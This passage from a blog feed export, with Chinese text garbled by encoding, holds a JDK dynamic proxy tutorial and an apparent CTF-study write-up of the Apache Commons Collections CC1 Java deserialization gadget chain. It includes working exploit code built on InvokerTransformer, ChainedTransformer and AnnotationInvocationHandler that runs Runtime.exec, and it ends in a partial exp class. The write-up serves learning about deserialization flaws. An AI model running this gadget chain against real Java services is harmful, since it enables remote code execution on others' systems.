title="åŠ¨æ€ä»£ç†"></a>åŠ¨æ€ä»£ç†</h1><p>åŠ¨æ€ä»£ç†æˆ‘ä»¬éœ€è¦ç”¨åˆ°ä¸‹é¢çš„æ–¹æ³•æ¥è·å–åŠ¨æ€ä»£ç†ç±»<br>Proxy.newProxyInstance()<br>è¿™ä¸ªæ–¹æ³•æ¥å—ä¸‰ä¸ªå‚æ•°ï¼Œéœ€è¦ä»£ç†çš„ç±»çš„åŠ è½½å™¨ï¼Œéœ€è¦ä»£ç†çš„ç±»çš„æ¥å£ï¼Œç»§æ‰¿äº†InvocationHandlerçš„ç±»<br>DEMOçš„ä»£ç å¦‚ä¸‹<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Main.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        User user=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        InvocationHandler handler=<span class="keyword">new</span> <span class="title class_">UserInvocationHandler</span>(user);</span><br><span class="line">        IUser proxy=(IUser)Proxy.newProxyInstance(user.getClass().getClassLoader(),user.getClass().getInterfaces(),handler);</span><br><span class="line">        proxy.getName();</span><br><span class="line">        proxy.getage();</span><br><span class="line">        proxy.gethigh();</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//UserInvocationHandler.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">        IUser user;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">UserInvocationHandler</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">         <span class="keyword">public</span> <span class="title function_">UserInvocationHandler</span><span class="params">(IUser user)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.user = user;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">            method.invoke(user, args);</span><br><span class="line">            System.out.println(<span class="string">&quot;è°ƒç”¨&quot;</span>+method.getName());</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//User.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">IUser</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;User&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getage</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;18&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">gethigh</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;181&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//IUser.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IUser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getName</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getage</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">gethigh</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>ä¸Šé¢çš„ä»£ç å®ç°äº†ä¸€ä¸ªç®€å•çš„åŠ¨æ€ä»£ç†ã€‚å…¶ä¸­å®šä¹‰çš„UserInvocationHandler.javaæ˜¯ä¸€ä¸ªå®ç°äº†InvocationHandleræ¥å£çš„ä¸€ä¸ªç±»ã€‚è¯¥æ¥å£éœ€è¦å®ç°ä¸€ä¸ªinvokeæ–¹æ³•è¯¥æ–¹æ³•åœ¨åŠ¨æ€ä»£ç†ç±»proxyè°ƒç”¨äº†ä¸€ä¸ªæ–¹æ³•æ—¶è§¦å‘ï¼Œè€Œinvokä¸­çš„å®ä¾‹useréœ€è¦æˆ‘ä»¬è‡ªå·±åœ¨æ„é€ æ–¹æ³•ä¸­å®šä¹‰ã€‚<br><img src="/2024/09/26/JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/3.png" class="" title="alt text"><br>å…¶å®åŠ¨æ€ä»£ç†çš„è¿‡ç¨‹å°±æ˜¯æˆ‘ä»¬å®šä¹‰çš„ä¸€ä¸ªä»£ç†proxyè°ƒç”¨äº†ä¸€ä¸ªæ–¹æ³•å¦‚proxy.getnameæ—¶ä¼šè‡ªåŠ¨è·³åˆ°æˆ‘ä»¬åœ¨å®šä¹‰è¿™ä¸ªproxyæ—¶ä¼ å…¥çš„ç¬¬ä¸‰ä¸ªå‚æ•°çš„UserInvocationHandlerç±»çš„invokeæ–¹æ³•ï¼Œç„¶åè¿è¡Œinvokeæ–¹æ³•ã€‚<br>è¿™ä¸ªè°ƒç”¨åŠ¨æ€ä»£ç†çš„çŸ¥è¯†ç‚¹åœ¨å­¦ä¹ CC1ä¸­çš„LazyMapçš„è°ƒç”¨é“¾çš„è¿‡ç¨‹ä¸­æœ‰ç”¨åˆ°</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JDKåŠ¨æ€ä»£ç† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CCé“¾</title>
      <link href="/2024/09/25/CC%E9%93%BE/"/>
      <url>/2024/09/25/CC%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="æ–‡ç« é¦–å‘äºfreebufjavaååºåˆ—åŒ–CC1-CC7çš„è°ƒè¯•è§£æ"><a href="#æ–‡ç« é¦–å‘äºfreebufjavaååºåˆ—åŒ–CC1-CC7çš„è°ƒè¯•è§£æ" class="headerlink" title="æ–‡ç« é¦–å‘äºfreebufjavaååºåˆ—åŒ–CC1-CC7çš„è°ƒè¯•è§£æ"></a>æ–‡ç« é¦–å‘äºfreebuf<a href="https://www.freebuf.com/articles/web/412973.html">javaååºåˆ—åŒ–CC1-CC7çš„è°ƒè¯•è§£æ</a></h1><h1 id="è¿™ç¯‡æ–‡ç« ç”¨äºè®°å½•æˆ‘å­¦ä¹ ccé“¾çš„è¿‡ç¨‹ï¼Œè¿™å‡ å¤©æ‰“äº†ä¸€ä¸‹æ ¡èµ›ï¼Œè¯´å®è¯æ‰“çš„ä¸å’‹åœ°ï¼Œæˆ‘å’Œé˜Ÿå‹å‘æŒ¥éƒ½ä¸å¤§è¡Œï¼Œæœ‰ç§ç™½å­¦è¿™ä¹ˆä¹…çš„ç¾ï¼ŒKPæ¯é‡Œæœ‰é“CC2çš„é¢˜ï¼Œè¯´å®è¯æ‰“æ¯”èµ›çš„æ—¶å€™æˆ‘åªæ˜¯åˆšå¼€å§‹å­¦cc1ï¼Œä¹Ÿæ²¡å®Œå…¨ç†è§£ï¼Œç°åœ¨OKäº†ã€‚"><a href="#è¿™ç¯‡æ–‡ç« ç”¨äºè®°å½•æˆ‘å­¦ä¹ ccé“¾çš„è¿‡ç¨‹ï¼Œè¿™å‡ å¤©æ‰“äº†ä¸€ä¸‹æ ¡èµ›ï¼Œè¯´å®è¯æ‰“çš„ä¸å’‹åœ°ï¼Œæˆ‘å’Œé˜Ÿå‹å‘æŒ¥éƒ½ä¸å¤§è¡Œï¼Œæœ‰ç§ç™½å­¦è¿™ä¹ˆä¹…çš„ç¾ï¼ŒKPæ¯é‡Œæœ‰é“CC2çš„é¢˜ï¼Œè¯´å®è¯æ‰“æ¯”èµ›çš„æ—¶å€™æˆ‘åªæ˜¯åˆšå¼€å§‹å­¦cc1ï¼Œä¹Ÿæ²¡å®Œå…¨ç†è§£ï¼Œç°åœ¨OKäº†ã€‚" class="headerlink" title="è¿™ç¯‡æ–‡ç« ç”¨äºè®°å½•æˆ‘å­¦ä¹ ccé“¾çš„è¿‡ç¨‹ï¼Œè¿™å‡ å¤©æ‰“äº†ä¸€ä¸‹æ ¡èµ›ï¼Œè¯´å®è¯æ‰“çš„ä¸å’‹åœ°ï¼Œæˆ‘å’Œé˜Ÿå‹å‘æŒ¥éƒ½ä¸å¤§è¡Œï¼Œæœ‰ç§ç™½å­¦è¿™ä¹ˆä¹…çš„ç¾ï¼ŒKPæ¯é‡Œæœ‰é“CC2çš„é¢˜ï¼Œè¯´å®è¯æ‰“æ¯”èµ›çš„æ—¶å€™æˆ‘åªæ˜¯åˆšå¼€å§‹å­¦cc1ï¼Œä¹Ÿæ²¡å®Œå…¨ç†è§£ï¼Œç°åœ¨OKäº†ã€‚"></a>è¿™ç¯‡æ–‡ç« ç”¨äºè®°å½•æˆ‘å­¦ä¹ ccé“¾çš„è¿‡ç¨‹ï¼Œè¿™å‡ å¤©æ‰“äº†ä¸€ä¸‹æ ¡èµ›ï¼Œè¯´å®è¯æ‰“çš„ä¸å’‹åœ°ï¼Œæˆ‘å’Œé˜Ÿå‹å‘æŒ¥éƒ½ä¸å¤§è¡Œï¼Œæœ‰ç§ç™½å­¦è¿™ä¹ˆä¹…çš„ç¾ï¼ŒKPæ¯é‡Œæœ‰é“CC2çš„é¢˜ï¼Œè¯´å®è¯æ‰“æ¯”èµ›çš„æ—¶å€™æˆ‘åªæ˜¯åˆšå¼€å§‹å­¦cc1ï¼Œä¹Ÿæ²¡å®Œå…¨ç†è§£ï¼Œç°åœ¨OKäº†ã€‚</h1><h1 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h1><p>å…ˆæ¥èŠä¸€ä¸‹CC1å§ã€‚<br>é¦–å…ˆæˆ‘ä»¬æƒ³è¦å‘½ä»¤æ‰§è¡Œå°±éœ€è¦æ‰¾åˆ°ä¸€ä¸ªæ¶æ„æ–¹æ³•ã€‚ä¹Ÿå°±æ˜¯å¦‚ä¸‹çš„ç±»æ–¹æ³•</p><img src="/2024/09/25/CC%E9%93%BE/CC1_1.png" class="" title="alt text"><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°InvokerTransformerä¸­çš„transformeræ–¹æ³•è¿›è¡Œäº†ä¸€ä¸ªåå°„è°ƒç”¨<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> O <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class&lt;?&gt; cls = input.getClass();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><br>å¯ä»¥å‘ç°å…¶è°ƒç”¨äº†method.invoke(input, this.iArgs);é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªtransformæ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ<br>é€šè¿‡æ„é€ æ–¹æ³•æˆ‘ä»¬å¯ä»¥ç›´åˆ°å…¶iMethodName,iParamTypes,iArgsæ˜¯æ€ä¹ˆä¼ å…¥çš„<br><img src="/2024/09/25/CC%E9%93%BE/CC1_2.png" class="" title="alt text"><br>å¯ä»¥å‘ç°æˆ‘ä»¬å…¶æ„é€ æ–¹æ³•æ˜¯publicçš„é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼æ¥æ„é€ å‘½ä»¤æ‰§è¡Œ<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DDEMO</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        invokerTransformer.transform(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬éœ€è¦ä»transformè¿™ä¸ªæ–¹æ³•æ¥å¯»æ‰¾å…¶ä»–è°ƒç”¨äº†è¯¥æ–¹æ³•çš„ç±»ï¼Œä»¥æ­¤æ¥è·³é“å…¶ä»–çš„ç±»ä¸­<br><img src="/2024/09/25/CC%E9%93%BE/CC1_4.png" class="" title="alt text"><br>æˆ‘ä»¬å¯»æ‰¾è°ƒç”¨äº†transformçš„ç±»å‘ç°äº†TransformedMapçš„cheakSetValue<br><img src="/2024/09/25/CC%E9%93%BE/CC1_5.png" class="" title="alt text"><br>ç»§ç»­å¯»æ‰¾å¯ä»¥æ‰¾åˆ°AbstractInputCheckedMapDecoratorçš„setvalue<br>æˆ‘ä»¬å…ˆæ‰¾åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬è¦æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªsetvalueæ˜¯å¦‚ä½•è§¦å‘çš„<br>setvalueè¿™ä¸ªæ–¹æ³•å…¶å®ç»å¸¸ç”¨åœ¨éå†Mapæ–¹æ³•ä¸­å¦‚ä¸‹ä»£ç <br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(Map.Entry entry:map.entrySet())</span><br><span class="line">        &#123;</span><br><span class="line">            entry.setValue(runtime);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><br>ä¸Šé¢çš„ä»£ç å°±æ˜¯ä¸€ä¸ªéå†mapä¸­çš„setValueæ–¹æ³•ï¼Œè€Œè¿™æ ·å°±ä¼šè·³åˆ°mapçš„cheakSetValue<br><img src="/2024/09/25/CC%E9%93%BE/CC1_10.png" class="" title="alt text"><br>æˆ‘ä»¬å¯ä»¥å‘ç°è¿™ä¸ªTransformedMapç±»æ˜¯ç»§æ‰¿äºå¦ä¸€ä¸ªAbstractInputCheckedMapDecoratorç±»æˆ‘ä»¬ä¸€æ­¥æ­¥çš„æ­¥å…¥ä¼šå‘ç°æœ€ç»ˆç»§æ‰¿çš„ä¸€ä¸ªç±»æ˜¯Mapç±»<br><img src="/2024/09/25/CC%E9%93%BE/CC1_11.png" class="" title="alt text"><br>å³è¿™ä¸ªTransformedMapå…¶å®å°±æ˜¯ä¸€ä¸ªMapç±»é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥éå†è¿™ä¸ªTransformedMapæ¥setvalueä»è€Œè°ƒç”¨è¿™ä¸ªTransformedMapçš„cheakSetvalueè€Œåè°ƒç”¨transform<br>å³æˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹æ³•æ¥å°è¯•è¿›è¡Œå‘½ä»¤æ‰§è¡Œ<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">    InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">    HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    map.put(<span class="string">&quot;a&quot;</span>,<span class="number">1</span>);</span><br><span class="line">    Map&lt;Object,Object&gt; transformedMap=TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line">    <span class="keyword">for</span>(Map.Entry entry:transformedMap.entrySet())</span><br><span class="line">    &#123;</span><br><span class="line">        entry.setValue(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>è€Œåæˆ‘ä»¬å†æŸ¥çœ‹setValueçš„è°ƒç”¨ä½ç½®<br><img src="/2024/09/25/CC%E9%93%BE/CC1_6.png" class="" title="alt text"><br>æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªreadObjectçš„ä¸€ä¸ªæ–¹æ³•ä¸‹è°ƒç”¨äº†setValueæ–¹æ³•<br><img src="/2024/09/25/CC%E9%93%BE/CC1_7.png" class="" title="alt text"><br>é‚£ä¹ˆæˆ‘ä»¬çš„é“¾å­å…¶å®å°±å·²ç»æ‰¾å…¨äº†ã€‚å¦‚ä¸‹<br><img src="/2024/09/25/CC%E9%93%BE/CC1_12.png" class="" title="alt text"><br>è™½ç„¶AnnotationInvocationHandlerä¸æ˜¯å…¬å…±ç±»ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åå°„è°ƒç”¨å®ƒ,AnnotationInvocationHandleræ„é€ å‡½æ•°çš„å‚æ•°æ—¶ä¸€ä¸ªæ³¨è§£ç±»å’Œä¸€ä¸ªMapï¼Œè¿™ä¸ªæ³¨è§£ç±»å…¶å®å°±æ˜¯æˆ‘ä»¬é‡å†™æ—¶çš„<code>@Override</code>ä¹‹ç±»çš„ã€‚<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class clazz=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor constructor=clazz.getConstructor(Class.class,Map.class);</span><br><span class="line">Object instance=constructor.newInstance(Target.class,transformedMap);</span><br></pre></td></tr></table></figure><br>ä½†æ˜¯æˆ‘ä»¬ç°åœ¨è¿˜æœ‰ä¸¤ä¸ªé—®é¢˜æ²¡æœ‰è§£å†³ï¼Œä¸€ä¸ªæ˜¯Runtimeè¿™ä¸ªç±»å¹¶æ²¡æœ‰ç»§æ‰¿Serializableæ¥å£ï¼Œæˆ‘ä»¬æ— æ³•å°†å…¶ååºåˆ—åŒ–ï¼Œå¦ä¸€ä¸ªæ˜¯æˆ‘ä»¬å¯ä»¥å‘ç°AnnotationInvocationHandlerä¸­è°ƒç”¨setValueå…¶ä¼ å…¥setValueçš„å€¼æ˜¯ä¸å¯æ§çš„æ˜¯å†™æ­»çš„ï¼Œè¿™å°±å¯¼è‡´æˆ‘ä»¬æ— æ³•å†setValueé‡Œä¼ å…¥Runtimeæ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><p>å…¶å®è¿™ä¸¤ä¸ªé—®é¢˜å¯ä»¥ä¸€æ¬¡è§£å†³<br>å°±æ˜¯å¦‚ä¸‹ä¸¤ä¸ªç±»<br><img src="/2024/09/25/CC%E9%93%BE/CC14.png" class="" title="alt text"><br><img src="/2024/09/25/CC%E9%93%BE/CC1_15.png" class="" title="alt text"><br>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»£ç çŸ¥é“<code>ChainedTransformer</code>å…¶å®ä¾‹åŒ–çš„å‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œè€Œå…¶å†è°ƒç”¨transformæ—¶ä¼šé€šè¿‡å¾ªç¯è®©æ•°ç»„ä¸­çš„æ¯ä¸ªç±»éƒ½è°ƒç”¨transformï¼Œè€Œå‰ä¸€ä¸ªè°ƒç”¨transformè¿”å›çš„å€¼ä½œä¸ºä¸‹ä¸€ä¸ªçš„transformçš„å‚æ•°ã€‚<br>å¦‚ä¸‹ä»£ç <br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] Transformer=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformer);</span><br></pre></td></tr></table></figure><br>åœ¨æ•°ç»„ä¸­ä¼ å…¥ConstantTransformerè€Œå…¶è°ƒç”¨Transformeråä¼šè¿”å›å®ä¾‹åŒ–ä¼ å…¥çš„å‚æ•°åŸå€¼å³å…¶è¿”å›Runtime.classä½œä¸ºä¸‹ä¸€ä¸ªInvokerTransformerçš„transformeræ¥è¿›è¡Œè°ƒç”¨ï¼Œå¦‚æ­¤å¾ªç¯æœ€ç»ˆå°±å¯ä»¥å‘½ä»¤æ‰§è¡Œ<br>æ‰€ä»¥æˆ‘ä»¬å°†chainedTransformerä¼ å…¥TransformedMapä¸­å½“éå†mapæ—¶å°±ä¼šè°ƒç”¨åˆ°chainedTransformerçš„transformer<br>è¿™æ—¶æˆ‘ä»¬å¯ä»¥å†™å‡ºå¦‚ä¸‹exp<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span 